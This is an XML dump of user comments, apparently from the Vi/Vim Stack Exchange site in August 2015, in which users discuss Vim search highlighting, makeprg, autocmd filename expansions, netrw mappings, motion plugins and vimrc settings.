  <row Id="6697" PostId="4504" Score="0" Text="@user1135541 Not reliably.  You can however run `system()` followed by `cgetexpr` instead of `make`." CreationDate="2015-08-24T18:35:57.360" UserId="2313" />
  <row Id="6698" PostId="4504" Score="0" Text="Strange, all of a sudden, I am getting this error `[No write since last change]&#xA;/home/sporty/.vimrc:1: *** missing separator (did you mean TAB instead of 8 spaces?).  Stop.&#xA;&#xA;Press ENTER or type command to continue&#xA;`" CreationDate="2015-08-24T18:59:21.640" UserId="3050" />
  <row Id="6699" PostId="4506" Score="1" Text="Is your `'hlsearch'` option set? Find out by typing `:set hlsearch?` in normal mode." CreationDate="2015-08-24T19:00:19.890" UserId="1306" />
  <row Id="6700" PostId="4504" Score="0" Text="You seem to be running `make` against your `vimrc`.  Perhaps do the above dance with `makeprg` only for the relevant files?" CreationDate="2015-08-24T19:10:53.970" UserId="2313" />
  <row Id="6702" PostId="4508" Score="0" Text="That *kinda* worked but I still don't get the smooth, line-by-line scrolling I get when `wrap` is unset. The behavior now looks actually inconsistent: more gradual (but still not line-by-line) scrolling while going up, and abrupt paragraph appearance when going down (see [GIF](http://i.imgur.com/AZn3kh0.gifv))." CreationDate="2015-08-24T19:38:32.470" UserId="3079" />
  <row Id="6703" PostId="4508" Score="0" Text="Too bad, cause reading the help page that really looked like my option." CreationDate="2015-08-24T19:39:07.567" UserId="3079" />
  <row Id="6704" PostId="4506" Score="0" Text="jjaderberg might be on the good track: it seems that Vim is highligting matches of the last pattern you searched for. If you make a new search with `/new pattern` dots will probably not be highligted anymore. In the doc [`:h hlsearch`](http://vimdoc.sourceforge.net/htmldoc/options.html#%27hlsearch%27) you can read &quot;When there is a previous search pattern, highlight all its matches&quot; then if `:set hlsearch?` outputs `hlsearch` you can use `set hlsearch!` to disable it." CreationDate="2015-08-24T20:26:25.393" UserId="1841" />
  <row Id="6705" PostId="4509" Score="0" Text="I added `set nohlsearch` to my `.vimrc` and worked like a charm. I did this because I have updated several files since the `.` appeared highlighted and doing `set nohlsearch` just turn off the highlighting in the current file. Thank you for the solution and the explanation." CreationDate="2015-08-24T21:02:09.067" UserId="3181" />
  <row Id="6706" PostId="26" Score="1" Text="Save two more keystrokes with `:so %`. `%` is set to the current file name of the buffer you edit, in this case `$MYVIMRC`" CreationDate="2015-08-24T21:30:44.423" UserId="3282" />
  <row Id="6707" PostId="4509" Score="1" Text="(I wonder if it's customary (good practice?) to wait for the OP author to confirm the issue (already) raised in the comments and give a chance to one of those authors to place their answers.)" CreationDate="2015-08-24T22:11:21.827" UserId="1800" />
  <row Id="6708" PostId="4509" Score="2" Text="Thank you for that hint, you are right. Sorry @jjaderberg and @statox. As you can tell I tried to give credit by linking their name in my answer. I wanted to mention the `:noh` command which was not mentioned before, but was unable to do so in a comment cause I had too little reputation." CreationDate="2015-08-24T22:40:34.027" UserId="3282" />
  <row Id="6709" PostId="4509" Score="3" Text="VanLaser is right I don't know if it is written somewhere but it is a part of the etiquette to let people who made useful comments to make their answers once the OP confirmed the problem is solved. The period without comments ends quickly if you make some good posts so no need to create an answer to add something which should have been a comment. No hard feeling for this time but remember to put respect before point hunting ;-)" CreationDate="2015-08-24T23:38:01.283" UserId="1841" />
  <row Id="6711" PostId="4496" Score="1" Text="I made a simple plugin for this, see [here](https://github.com/lervag/dotvim/blob/master/bundle_local/log-autocmds/plugin/log-autocmds.vim)." CreationDate="2015-08-25T07:49:03.360" UserId="21" />
  <row Id="6712" PostId="4346" Score="0" Text="Also see: [Is there a simpler way to link to the help?](http://meta.vi.stackexchange.com/q/1248/51) at meta" CreationDate="2015-08-25T08:04:47.020" UserId="51" />
  <row Id="6713" PostId="4508" Score="2" Text="According to `:help 'scrolljump'` I think that the minimum jump you can get is one line when the cursor moves off-screen. But with `wrap` set as in your case, one line may occupy multiple screen lines." CreationDate="2015-08-25T09:42:47.527" UserId="599" />
  <row Id="6714" PostId="4509" Score="0" Text="It's not too late for those who commented but didn't post an answer to do so.   I can't speak for everywhere but I'm more likely to upvote people who've commented and then posted, over the glory boys!  Have faith in the system to work." CreationDate="2015-08-25T10:51:17.467" UserId="859" />
  <row Id="6715" PostId="4504" Score="0" Text="Hmm, so I am in VIM, the current file is the `ring_buffer_test.cpp`.  Should the VIM not replace `%` with `ring_buffer_test.cpp` and do the substitution?  Why is it running against some random file?  In fact it did run it against some other source file." CreationDate="2015-08-25T13:22:32.873" UserId="3050" />
  <row Id="6716" PostId="4498" Score="0" Text="Put `let g:ycm_confirm_extra_conf = 0` in your `vimrc` to see if it will automatically load your conf and show the completions. One of the plugins you've installed might have silenced the prompt from YCM (the one you see in your log)." CreationDate="2015-08-25T13:27:37.533" UserId="20" />
  <row Id="6717" PostId="4501" Score="1" Text="Something like http://vimrcfu.com/ maybe? It's mostly for snippets though." CreationDate="2015-08-25T13:46:43.247" UserId="20" />
  <row Id="6718" PostId="4346" Score="0" Text="@Carpetsmoker I knew I'd seen this somewhere before, but I couldn't find it here and didn't think to search [meta]. Should I delete this?" CreationDate="2015-08-25T13:56:46.750" UserId="205" />
  <row Id="6719" PostId="4486" Score="1" Text="I still think the best plugin for this is [easymotion](https://github.com/easymotion/vim-easymotion)" CreationDate="2015-08-25T14:12:09.420" UserId="599" />
  <row Id="6720" PostId="4346" Score="0" Text="@muru I don't think so; if anything, the meta thread should be closed, IMHO." CreationDate="2015-08-25T14:55:30.940" UserId="51" />
  <row Id="6721" PostId="4506" Score="0" Text="Another way for removing the highlight is setting the `last search register` to empty `:let @/ = &quot;&quot;` but it will clear your last search not only disable the highlighting. I have this mapping on my `.vimrc` `nnoremap &lt;silent&gt;&lt;leader&gt;cs :let @/ = &quot;&quot;&lt;cr&gt;`" CreationDate="2015-08-25T14:56:31.827" UserId="1453" />
  <row Id="6722" PostId="4509" Score="0" Text="As he seems new, I just hope @cbaumhardt is not put off by this (I was just giving a friendly suggestion)." CreationDate="2015-08-25T15:20:13.330" UserId="1800" />
  <row Id="6723" PostId="4509" Score="1" Text="No worries, I am not. I took your advice as the tip you meant to give and I appreciate it :)" CreationDate="2015-08-25T15:21:30.070" UserId="3282" />
  <row Id="6724" PostId="4501" Score="0" Text="@Nobe4: Looking at your Github page, you happen to be more familiar with Github than I am. I don't know whether a voting system would work there, which to me seems essential." CreationDate="2015-08-25T15:42:50.400" UserId="3282" />
  <row Id="6725" PostId="4501" Score="0" Text="@tokoyami: Thanks for mentioning http://vimrcfu.com/. However its focus is somewhat different as you said and it seems to lack an active community." CreationDate="2015-08-25T15:42:55.973" UserId="3282" />
  <row Id="6726" PostId="4502" Score="0" Text="That plugin [just loads the HTML indentation](https://github.com/Glench/Vim-Jinja2-Syntax/blob/master/indent/jinja.vim) (just like the default `htmldjango` filetype which comes with Vim, and works quite well for Jinja2 in my experience)... You will probably have to do this yourself, by copying the HTML indent file, and modify it so that it recognized Django-style blocks. The file is over 1,000 lines, so this is probably more involved than one or two extra lines..." CreationDate="2015-08-25T15:51:00.077" UserId="51" />
  <row Id="6727" PostId="4502" Score="0" Text="... Or, easier, just learn to press a `&lt;Tab&gt;` key after opening a `{% ...` block, an the `&lt;Backspace&gt;` when closing one. This works quite well for me..." CreationDate="2015-08-25T15:54:11.240" UserId="51" />
  <row Id="6729" PostId="4501" Score="0" Text="@cbaumhardt : The voting system on github is quite a hot topic because many users wants one and no one is provided. But I am not quite sure how you would use a voting system." CreationDate="2015-08-25T16:36:04.083" UserId="1821" />
  <row Id="6731" PostId="4486" Score="1" Text="I also made a plugin: [improvedft](https://github.com/chrisbra/improvedft)" CreationDate="2015-08-25T16:55:42.920" UserId="71" />
  <row Id="6732" PostId="4515" Score="0" Text="You should mention the other alternatives as well" CreationDate="2015-08-25T16:55:58.130" UserId="71" />
  <row Id="6733" PostId="4506" Score="0" Text="@jjaderberg  @statox Thank you all for your comments and support! I've learned a lot since I post this question yesterday! Now I have rules on my `.vimrc` about the highlighting. It was indeed `hlsearch`. It's funny how something like a search can drive you crazy. @vappolinario I'll try your suggestion too! thanks!" CreationDate="2015-08-25T16:56:31.760" UserId="3181" />
  <row Id="6734" PostId="4514" Score="0" Text="It's not only ugly, but wrong: it won't trigger on e.g. `foo.txt`. The correct negation of `*.tex` is `{*[^.]???,*[^t]??,*[^e]?,*[^x]}`" CreationDate="2015-08-25T22:44:45.987" UserId="8" />
  <row Id="6737" PostId="4509" Score="0" Text="In my .vimrc, I've got a mapping: `nnoremap &lt;silent&gt; &lt;leader&gt;/ :nohlsearch&lt;CR&gt;`. Since I've also set `mapleader` to comma, a simple `,/` will clear the search highlight for the current window, without disabling it altogether. Handy if you like to have search highlighting when you actually are searching, but want it gone once you're finished." CreationDate="2015-08-26T01:17:47.223" UserId="2736" />
  <row Id="6740" PostId="4521" Score="0" Text="Do you think the difference can be that `&lt;afile&gt;` is only the filename whereas `&lt;amatch&gt;` is the complete path for the file ?" CreationDate="2015-08-26T06:39:06.773" UserId="1821" />
  <row Id="6741" PostId="4521" Score="0" Text="@Nobe4 yes, that's *always* how it turns out. `%`, however, is faithful to whatever I actually mentioned. But I'm not sure I can trust `%` here. :/" CreationDate="2015-08-26T06:40:21.940" UserId="205" />
  <row Id="6742" PostId="4521" Score="0" Text="If you type `vim /tmp/.zshrc` they're the same strings. If your cwd is `/tmp` you will get an absolute path, and a relative path, and while they are not the same strings, they are the same paths." CreationDate="2015-08-26T06:40:25.767" UserId="51" />
  <row Id="6743" PostId="4521" Score="0" Text="@Carpetsmoker I typed just plain `vim .zshrc`" CreationDate="2015-08-26T06:41:18.960" UserId="205" />
  <row Id="6744" PostId="4521" Score="0" Text="In expand you can have : `expand('&lt;amatch&gt;') == expand('%:p')` and `expand('&lt;afile&gt;') == expand('%')` . What do you think ? Edit: Just saw your edition, the `expand('&lt;afile&gt;') == expand('%')` doesn't apply anymore" CreationDate="2015-08-26T06:43:33.543" UserId="1821" />
  <row Id="6746" PostId="4518" Score="0" Text="You should try `&lt;Esc&gt;a`." CreationDate="2015-08-26T07:21:41.030" UserId="54" />
  <row Id="6748" PostId="4509" Score="0" Text="[tpope's vim-sensible plugin](https://github.com/tpope/vim-sensible/blob/master/plugin/sensible.vim#L31) includes a mapping for this as well: `&lt;C-L&gt;`. That's what I use cause I also don't want to disable it altogether." CreationDate="2015-08-26T08:35:03.333" UserId="3282" />
  <row Id="6749" PostId="4486" Score="0" Text="Personally, I find easymotion a bit too intrusive. I do not like the automatic search highlighting in clever-f, therefore I would not choose it.  That leaves improvedft and vim-fanfingtastic. Which one is in your opinion more mature? Besides their respective (small) limitations mentioned on the website, the only thing I noticed in a quick test of both was that showcmd no longer works." CreationDate="2015-08-26T08:51:09.837" UserId="3282" />
  <row Id="6750" PostId="4521" Score="0" Text="I'm not absolutely sure but isn't `&lt;amatch&gt;` the pattern match of the autocmd? If you use `BufNewFile` it will be the filename; apparently absolute from your examples. For `FileType` it should then be the matched file type: `zsh` for your example if you replace `BufNewFile` with `FileType`." CreationDate="2015-08-26T10:14:24.500" UserId="20" />
  <row Id="6751" PostId="4521" Score="0" Text="@tokoyami (mostly) yes. The question is, why does `&lt;amatch&gt;`  differ from `&lt;afile&gt;` in cases other than those specified in the docs? So, `FileType` is pretty much irrelevant." CreationDate="2015-08-26T10:17:42.487" UserId="205" />
  <row Id="6752" PostId="4523" Score="0" Text="See (also) this: http://vi.stackexchange.com/a/4003/1800" CreationDate="2015-08-26T10:38:35.473" UserId="1800" />
  <row Id="6753" PostId="4521" Score="0" Text="@muru Ah, got it." CreationDate="2015-08-26T10:40:13.503" UserId="20" />
  <row Id="6754" PostId="4518" Score="0" Text="Perhaps configure urxvt? (e.g. something like https://bbs.archlinux.org/viewtopic.php?id=71462)" CreationDate="2015-08-26T10:44:22.290" UserId="1800" />
  <row Id="6755" PostId="4513" Score="0" Text="Are you able to provide a link to where this issue has being discussed? I'd like to know more." CreationDate="2015-08-26T11:39:07.670" UserId="3079" />
  <row Id="6756" PostId="4430" Score="0" Text="Does the same issue happen when using the solution in http://stackoverflow.com/questions/28417300/in-vim-how-to-visual-select-previously-pasted-text ?" CreationDate="2015-08-26T12:55:48.923" UserId="599" />
  <row Id="6757" PostId="4526" Score="0" Text="That seems to be the behaviour, yes. But do you have anything to support this answer?" CreationDate="2015-08-26T13:06:13.133" UserId="205" />
  <row Id="6758" PostId="4513" Score="1" Text="[here](https://groups.google.com/d/msg/vim_use/TOscNwiwy5E/eyl3dZOrsL0J) or [here](https://groups.google.com/d/msg/vim_dev/AmMWxM0dIIA/-97E3jal3IsJ)" CreationDate="2015-08-26T13:08:27.703" UserId="71" />
  <row Id="6759" PostId="4526" Score="3" Text="@muru: You mean, other than my good looks and my perfect smile? ;) Yeah, I think I do: [&lt;afile&gt;](https://github.com/vim/vim/blob/8060687905bdadc46abb68ee6d40e5660e352297/src/ex_docmd.c#L10623-L10640) and [&lt;amatch&gt;](https://github.com/vim/vim/blob/8060687905bdadc46abb68ee6d40e5660e352297/src/ex_docmd.c#L10652-L10659) sources." CreationDate="2015-08-26T13:13:00.493" UserId="2313" />
  <row Id="6760" PostId="4527" Score="1" Text="Not sure about &quot;proper&quot;, but [syntastic](https://github.com/scrooloose/syntastic) does support linting with `coffee` and `coffeelint`.  If you have suggestions for other linters post to the [issue tracker](https://github.com/scrooloose/syntastic/issues)." CreationDate="2015-08-26T13:41:40.687" UserId="1577" />
  <row Id="6761" PostId="4527" Score="1" Text="@lcd047 Well there are some guessing plugins. That are not strictly for coffeescript but sort of help and these help with the tags and autofilling not syntax" CreationDate="2015-08-26T13:44:38.913" UserId="3322" />
  <row Id="6762" PostId="4527" Score="2" Text="This is a question for google." CreationDate="2015-08-26T14:10:46.613" UserId="54" />
  <row Id="6763" PostId="4528" Score="0" Text="You want something on the lines of 'semantic highlighting', if it helps (for searching)." CreationDate="2015-08-26T16:11:44.400" UserId="1800" />
  <row Id="6764" PostId="4526" Score="0" Text="In general, afile is not the same as amatch, as it can quite be different depending on the autocommand event." CreationDate="2015-08-26T16:26:51.557" UserId="71" />
  <row Id="6765" PostId="4526" Score="2" Text="@ChristianBrabandt Yes. The point of the question is, they can _still_ be different for `autocmd`s where `&lt;afile&gt;` and `&lt;amatch&gt;` _do_ refer to the same thing (namely, to a file), contrary to what the manual implies.  My answer explains how and why they differ in that particular case.  Better now? :)" CreationDate="2015-08-26T17:42:39.267" UserId="2313" />
  <row Id="6766" PostId="489" Score="0" Text="... which would also be nice, actually, but I think there are some things that can't be known from the definition: e.g., is the declaration supposed to be `inline`? Are there default arguments? Should the argument names be elided?" CreationDate="2015-08-26T17:52:52.287" UserId="1060" />
  <row Id="6767" PostId="4526" Score="0" Text="@SatoKatsura, yes better. Thanks" CreationDate="2015-08-26T18:20:48.417" UserId="71" />
  <row Id="6768" PostId="489" Score="0" Text="@200_success Ah, you're right (I don't know why I didn't reply to your comment earlier). When I have time, I'll try to edit my answer to go the other way." CreationDate="2015-08-26T18:59:11.843" UserId="88" />
  <row Id="6769" PostId="4524" Score="0" Text="There are no such options in `vimtex` today, no. But it seems to make sense to ignore spelling in minted environments, so I might update the plugin correspondingly. Thanks for the nice explanation!" CreationDate="2015-08-26T21:07:18.850" UserId="21" />
  <row Id="6770" PostId="4523" Score="0" Text="@Gregoire also mentioned this question in [vimtex/issues/#219](https://github.com/lervag/vimtex/issues/219)." CreationDate="2015-08-26T21:08:36.043" UserId="21" />
  <row Id="6771" PostId="4430" Score="0" Text="@Vitor Yes, it was happening also with that solution, but this was due to the timeoutlen option which didn't let me to use mappings with more than one letter." CreationDate="2015-08-26T21:23:17.977" UserId="210" />
  <row Id="6772" PostId="4515" Score="0" Text="Wasn't me :) I mentioned https://github.com/rhysd/clever-f.vim" CreationDate="2015-08-26T22:25:14.877" UserId="1800" />
  <row Id="6773" PostId="4532" Score="1" Text="It *is* in the recent help: &quot;Numbered register 1 contains the text deleted by the most recent delete or change command, *unless the command* specified another register *or the text is less than one line (the small delete register is used then)*.  An exception is made for the delete operator with these movement commands: |%|, |(|, |)|, |`|,&quot;" CreationDate="2015-08-26T22:35:22.380" UserId="1800" />
  <row Id="6774" PostId="4530" Score="0" Text="It probably helps (at least with `f` , `t` etc.) if you don't conceal the current line - by disabling `n` from the `'concealcursor'` option." CreationDate="2015-08-26T22:41:24.483" UserId="1800" />
  <row Id="6775" PostId="4532" Score="0" Text="Thanks. I'd like to accept your comment as answer." CreationDate="2015-08-26T23:06:08.593" UserId="477" />
  <row Id="6776" PostId="4532" Score="0" Text="I'm curious if you have the same text in your vim version (as I don't know if it's a recent addition)." CreationDate="2015-08-26T23:35:48.067" UserId="1800" />
  <row Id="6777" PostId="4532" Score="0" Text="@VanLaser The help is the same, my previous understanding is incorrect." CreationDate="2015-08-27T00:47:32.887" UserId="477" />
  <row Id="6778" PostId="4534" Score="0" Text="-i does not start insert mode" CreationDate="2015-08-27T06:21:09.913" UserId="71" />
  <row Id="6779" PostId="4529" Score="0" Text="this seems a manually enabling method, to achieve different keywords with different color. I could not get the way to get it automatically like syntax highlighting." CreationDate="2015-08-27T06:38:31.780" UserId="3323" />
  <row Id="6780" PostId="4529" Score="1" Text="I don't know what you mean by &quot;automatic&quot;. Somehow you have to specify the addresses you wish to highlight. Since the addresses of interest are likely to change from file to file and from time to time, I thought that being able to select them manually would be a feature. Once selected, you can save them with `:MarkSave` and load them with `:MarkLoad`. You can even load them automatically by setting `g:mwAutoLoadMarks`. Alternatively, you could use the `matchadd()` function (`:help matchadd()`). It's hard to know what to suggest without knowing more about what you want." CreationDate="2015-08-27T06:55:18.460" UserId="2055" />
  <row Id="6781" PostId="4538" Score="0" Text="I would add a check that the current file is actually the vimrc file, otherwise it will apply that on every file." CreationDate="2015-08-27T07:13:52.750" UserId="1821" />
  <row Id="6782" PostId="4533" Score="0" Text="If you don't want to install a plugin like vim-peekaboo, you can also use the builtin-command `:reg` instead. The difference is that the registers are grouped in vim-peekaboo, open in a horizontal split (instead of vertical split), open without you entering a separate command and overall look visually more appealing." CreationDate="2015-08-27T07:59:49.663" UserId="3282" />
  <row Id="6783" PostId="4538" Score="0" Text="When sourcing the vimrc the current file should be the vimrc, right?" CreationDate="2015-08-27T08:13:05.423" UserId="71" />
  <row Id="6784" PostId="4539" Score="0" Text="It was probably not needed when creating it" CreationDate="2015-08-27T08:15:53.683" UserId="71" />
  <row Id="6785" PostId="4538" Score="0" Text="Yes, but the vimrc file is sourced everytime you open vim, so let say you open it with a document that contain some inline configuration (e.g. a modeline) it will override it. You can make the condition change as little as `expand('%') == '.vimrc'` (on unix) and it will override the config only for the vimrc file." CreationDate="2015-08-27T08:17:20.927" UserId="1821" />
  <row Id="6786" PostId="4539" Score="0" Text="Maybe because you can exit Vim by sourcing?" CreationDate="2015-08-27T08:44:58.887" UserId="205" />
  <row Id="6787" PostId="4538" Score="0" Text="I don't understand your problem. modelines are executed later than the .vimrc so it shouldn't matter, also this happens only on startup or when manually sourcing the file, which is rather seldom, so this will not have a performance impact." CreationDate="2015-08-27T08:47:02.953" UserId="71" />
  <row Id="6789" PostId="4539" Score="0" Text="@muru: what do you mean ?" CreationDate="2015-08-27T08:53:04.030" UserId="1821" />
  <row Id="6790" PostId="4539" Score="1" Text="@Nobe4 if I have `wqa!` in a file and I source it, Vim will quit, right? With most other events, it's quite unlikely that Vim will exit unless there's a fatal error. So there's no way to be reasonably sure if Vim can get commands to run after sourcing." CreationDate="2015-08-27T09:01:47.130" UserId="205" />
  <row Id="6791" PostId="4539" Score="0" Text="@muru: OK I see your point, a summary could be that `SourcePost` was not provided because the sourcing could quit Vim? Do you know if there is a method to do the event &quot;catching&quot; manually ? e.g. execute a methode after the sourcing of a file (if vim is still open obviously)" CreationDate="2015-08-27T09:05:28.560" UserId="1821" />
  <row Id="6792" PostId="4541" Score="0" Text="Even though it doesn't answer you question, I tried with vim-plug instead of Vundle and it worked perfectly..." CreationDate="2015-08-27T09:23:48.197" UserId="1821" />
  <row Id="6793" PostId="4524" Score="0" Text="I looked around in the code and I didn't find an existing region for minted environment so I tried to create my own like this: `syn region mintedZone start=&quot;\\begin{minted}&quot; end=&quot;\\end{minted}&quot; contains=@NoSpell` but it doesn't seem to help. Any suggestion?" CreationDate="2015-08-27T09:31:58.760" UserId="3320" />
  <row Id="6794" PostId="4546" Score="1" Text="If you set `shiftwidth` to zero and `softtabstop` to -1 it will follow the tabstop setting." CreationDate="2015-08-27T09:57:06.567" UserId="71" />
  <row Id="6795" PostId="4541" Score="2" Text="See the [faq](https://vimhelp.appspot.com/vim_faq.txt.html#faq-26.6)" CreationDate="2015-08-27T10:06:43.373" UserId="71" />
  <row Id="6796" PostId="4547" Score="0" Text="I might have discovered a bug in this case (or just weird behaviour): 1. edit a buffer, don't save; 2. set hidden; 3. switch to another buffer; 4. set nohidden; 5. go back to hidden buffer; 6. go back to non-hidden buffer: the result is that the hidden buffer is automatically saved. Is this working as expected?" CreationDate="2015-08-27T10:46:07.290" UserId="3332" />
  <row Id="6797" PostId="4549" Score="0" Text="I mean the **-i** option. I've got it from `vi --help`; _vi version: 2.2.0_" CreationDate="2015-08-27T11:04:56.673" UserId="3327" />
  <row Id="6799" PostId="4549" Score="0" Text="Also you can see the _input mode_ in various places like `:help` and `vi --help`." CreationDate="2015-08-27T11:10:29.540" UserId="3327" />
  <row Id="6800" PostId="4539" Score="0" Text="Excuse me for interjecting, but I don't think being able to quit makes any sense as an explanation. Any script can quit.  Any normal `autocmd` can also quit. So what? What's wrong with that? What's right about not doing it? Rather, I don't see any use for a `SourcePost`.  `SourcePre` could be useful for debugging.  Overriding `SourceCmd` could be useful for things like fetching the script from a remote location, and then you'd also be able to add code afterwards.  But adding code without overriding `SourceCmd`?  I can't really think of any useful scenario." CreationDate="2015-08-27T11:19:56.393" UserId="2313" />
  <row Id="6801" PostId="4549" Score="0" Text="I might be mistaken here, but [according to Wikipedia](https://en.wikipedia.org/wiki/Vi#Distribution) vi version 2.7 is from 1979. Does this mean you actually use software older than 35 years?" CreationDate="2015-08-27T11:31:47.593" UserId="3282" />
  <row Id="6802" PostId="4549" Score="0" Text="@cbaumhardt, You are right :-D. Of course I use _elvis 2.2.0_ I should search more about it. You are right. I found that my *vi* is a symbolic link to *elvis* maybe they are different in this situation. I should read more." CreationDate="2015-08-27T11:44:49.837" UserId="3327" />
  <row Id="6804" PostId="4549" Score="0" Text="Looking at the [elvis help files](https://github.com/mbert/elvis/blob/a648881a79c83f5170404d01e442889fbdf3549a/doc/elvisinp.html) I would say that what is called `insert mode` in Vim is called `input mode` in elvis. Both modes have similar roots, but might differ in certain ways, e.g. with the `-i` flag." CreationDate="2015-08-27T12:11:05.910" UserId="3282" />
  <row Id="6805" PostId="4546" Score="0" Text="thanks for your explanations. I'd like to maintain most of my settings in my vimrc because I want to sync them to multiple computers. I used your solution in my vimrc and used the [faq](https://vimhelp.appspot.com/vim_faq.txt.html#faq-26.6) link @ChristianBrabandt posted below my question and it works. I'll edit my question to include my solution." CreationDate="2015-08-27T12:11:45.740" UserId="3331" />
  <row Id="6806" PostId="4550" Score="0" Text="Can you check all the times that the `Syntax` event is being called ? [This might help you](https://gist.github.com/nobe4/aa8313fe98ca8821afad). You could have an insight of why the syntax is reset ..." CreationDate="2015-08-27T12:15:54.527" UserId="1821" />
  <row Id="6807" PostId="4546" Score="0" Text="No, you should post a proper answer and accept it." CreationDate="2015-08-27T12:28:16.907" UserId="54" />
  <row Id="6808" PostId="4539" Score="0" Text="@SatoKatsura: I thought about a function in the vimrc that would be called after sourcing the vimrc." CreationDate="2015-08-27T12:44:27.133" UserId="1821" />
  <row Id="6809" PostId="4547" Score="0" Text="@stamm, can't reproduce" CreationDate="2015-08-27T13:28:22.603" UserId="71" />
  <row Id="6810" PostId="4541" Score="0" Text="You could also use the new OptionSet autocommand to reset the shiftwidth and softtabstop setting" CreationDate="2015-08-27T13:30:36.467" UserId="71" />
  <row Id="6811" PostId="4536" Score="0" Text="I tried both solutions but this one worked as I wanted. I am not a huge fan of modelines but for my own vimrc seems useful. I think something in my vimrc is preventing christian's solution to work, otherwise I'd choose his as the accepted answer. Anyways, thank you all for the help." CreationDate="2015-08-27T13:33:25.447" UserId="977" />
  <row Id="6812" PostId="4547" Score="1" Text="@stanm: can't reproduce either, after the 5. the first buffer is still changed but now I can't go back to the second buffer (because `nohidden` is set). What is your config ?" CreationDate="2015-08-27T13:38:53.210" UserId="1821" />
  <row Id="6813" PostId="4539" Score="0" Text="It still doesn't make sense.  Sourcing is a pretty special thing to do, you normally want `runtime` instead.  And you can always define a `SourceCmd`, that sources `&lt;afile&gt;` and runs your function. _shrug_" CreationDate="2015-08-27T13:46:30.783" UserId="2313" />
  <row Id="6814" PostId="4539" Score="0" Text="Well maybe it's me that have trouble understanding why it doesn't make sens ^^ But yes the `SourceCmd` would be a good workaround :) Thanks" CreationDate="2015-08-27T13:48:30.137" UserId="1821" />
  <row Id="6815" PostId="4547" Score="0" Text="@Nobe4: okay, that's what I expected as behaviour. My config sources multiple external rc files (corp), so perhaps somewhere in there is the reason. Thanks for the help, though!" CreationDate="2015-08-27T14:16:45.783" UserId="3332" />
  <row Id="6816" PostId="4549" Score="3" Text="This proves, beyond any doubt, ... that Elvis is not dead." CreationDate="2015-08-27T14:24:21.550" UserId="1800" />
  <row Id="6817" PostId="4486" Score="0" Text="One desirable feature is to have `.` repeats remember the count rather than the number of chars consumed.  (E.g. `d4t|` `&lt;CR&gt;.` should find the fourth `|` no matter its column.)  fanfingtastic does this, but I'm not sure about improvedft or clever-f." CreationDate="2015-08-27T15:23:24.453" UserId="630" />
  <row Id="6818" PostId="4553" Score="0" Text="Moving the remappings into &quot;after&quot; and using nmap instead of nnoremap doesn't seem to change the apparent behavior I'm seeing, which is that &lt;CR&gt; and : end up mapped to exactly the same thing (verbose nmap says they were both last set in the after/ftplugin/netrw.vim file)." CreationDate="2015-08-27T17:24:03.940" UserId="72" />
  <row Id="6819" PostId="4555" Score="0" Text="You might have a look [here](http://vim.wikia.com/wiki/Search_for_lines_not_containing_pattern)." CreationDate="2015-08-27T17:57:07.247" UserId="3282" />
  <row Id="6820" PostId="4555" Score="1" Text="... which gives something like `/\v^((pattern)@!.)*$`" CreationDate="2015-08-27T18:03:05.340" UserId="1800" />
  <row Id="6822" PostId="4525" Score="0" Text="thanks for mentioning my plugin" CreationDate="2015-08-27T18:52:33.740" UserId="71" />
  <row Id="6823" PostId="4560" Score="0" Text="TIL `:LogiPat` :)" CreationDate="2015-08-27T19:03:56.150" UserId="1800" />
  <row Id="6824" PostId="4560" Score="0" Text="Beware however that the patterns produced by `LogiPat` are not always perfect (cf. `:help logipat-caveat`).  &quot;Negating&quot; regexps is always tricky, and `LogiPat` is not a silver bullet." CreationDate="2015-08-27T19:05:03.713" UserId="2313" />
  <row Id="6825" PostId="4560" Score="0" Text="@SatoKatsura True" CreationDate="2015-08-27T19:08:37.520" UserId="71" />
  <row Id="6826" PostId="4553" Score="0" Text="What did you put in that file?" CreationDate="2015-08-27T19:43:23.253" UserId="54" />
  <row Id="6827" PostId="4553" Score="0" Text="Exactly the contents of `s:ConfigureNetrw` I edited into my question (and eventually exactly those two lines in my latest edit, and described permutations)." CreationDate="2015-08-27T20:00:31.993" UserId="72" />
  <row Id="6828" PostId="4553" Score="0" Text="I have done exactly what I describe in my answer. The result is that pressing `&lt;CR&gt;` in netrw starts command-line mode and `:verbose map &lt;CR&gt;` shows that mapping in that file. I have no idea what else you expect." CreationDate="2015-08-27T20:16:18.857" UserId="54" />
  <row Id="6829" PostId="4553" Score="0" Text="What exactly are you trying to do with `execute &quot;nnoremap &lt;buffer&gt; o &quot; . maparg(&quot;&lt;CR&gt;&quot;, &quot;n&quot;)`?" CreationDate="2015-08-27T20:25:12.790" UserId="54" />
  <row Id="6830" PostId="4547" Score="0" Text="@stanm maybe `autowrite` gets involved? `set autowrite?` and `set autowriteall?`, what do they show?" CreationDate="2015-08-27T20:42:54.283" UserId="1097" />
  <row Id="6831" PostId="4553" Score="0" Text="I'm trying to move the functionality originally mapped to &lt;CR&gt; to another key. Since netrw's default &lt;CR&gt; map has expanded &lt;SID&gt;s in the right-hand side I can't map it directly, this the attempt at using maparg to move it." CreationDate="2015-08-27T20:45:35.160" UserId="72" />
  <row Id="6832" PostId="4553" Score="0" Text="Let us [continue this discussion in chat](http://chat.stackexchange.com/rooms/27483/discussion-between-josh-petrie-and-romainl)." CreationDate="2015-08-27T20:54:00.163" UserId="72" />
  <row Id="6833" PostId="4551" Score="0" Text="weird, if I add the `s:` flag to the method name and `foldexpr` call as suggested the folds are not created anymore?" CreationDate="2015-08-27T21:06:08.827" UserId="3334" />
  <row Id="6834" PostId="4550" Score="0" Text="strange, when using your the example file as my `.vimrc` look what happened when trying to edit `index.html` file. https://asciinema.org/a/ej8meo7k8bcgpyeiifbbhnv0k" CreationDate="2015-08-27T21:15:33.540" UserId="3334" />
  <row Id="6835" PostId="4550" Score="0" Text="never happened to me before, did you try just sourcing the file with your normal vimrc?" CreationDate="2015-08-27T21:48:49.537" UserId="1821" />
  <row Id="6836" PostId="4562" Score="1" Text="Even easier: Use `@:` to repeat last ex command." CreationDate="2015-08-28T06:09:07.047" UserId="21" />
  <row Id="6837" PostId="4566" Score="0" Text="In netrw? Not to my knowledge. In Vim? Yes of course, there are many ways to find files, including that very same command. But `find . -name &quot;pattern&quot;` on its own would be just as pointless in Vim as in your shell. You want to find files, OK, but what do you want to do with the result?" CreationDate="2015-08-28T08:20:06.697" UserId="54" />
  <row Id="6838" PostId="4550" Score="0" Text="@Nobe4 weird, isn't it? I have also appended the code provided to my `.vimrc` file, but it had the same result I'm afraid. :( Perhaps my vim installation is broken? I simply installed on mac through `brew install vim`" CreationDate="2015-08-28T08:32:44.147" UserId="3334" />
